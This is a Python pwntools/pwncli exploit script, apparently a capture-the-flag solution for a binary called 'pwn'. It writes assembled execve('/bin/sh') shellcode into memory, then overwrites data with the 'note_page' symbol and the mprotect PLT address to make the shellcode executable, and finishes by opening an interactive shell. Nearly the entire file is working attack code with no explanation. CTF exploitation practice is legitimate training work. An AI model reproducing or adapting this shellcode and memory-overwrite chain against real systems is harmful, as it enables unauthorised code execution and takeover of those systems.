#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
context.arch = "amd64"
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def call_func(choice, off=0, length=0):
    ru(b'Give me your choice:\n')
    sl(i2b(choice))
    ru(b"Where'd you love to start?\n")
    sl(i2b(off))
    if (choice == 1):
        ru(b"How much do you want to write?")
        sl(i2b(length))

def flag2():
    call_func(1, 0, 0x100)
    bin_sh_bytes = u64_ex(b"/bin/sh\x00")
    payload = asm(f'''
        mov rax, {bin_sh_bytes};
        push rax;
        mov rdi, rsp;
        xor rsi, rsi;
        xor rdx, rdx;
        push 0x3b;
        pop rax;
        syscall;
    ''')
    s(payload)
    call_func(1, 0xf8, 0x100)
    s(p64(elf.symbols["note_page"]) + b"a"*5 + b"\x00"*3 + p64(elf.plt["mprotect"]))
    debugB()
    call_func(1, 0x1000, 0x5)
    call_func(-1)


flag2()

ia()
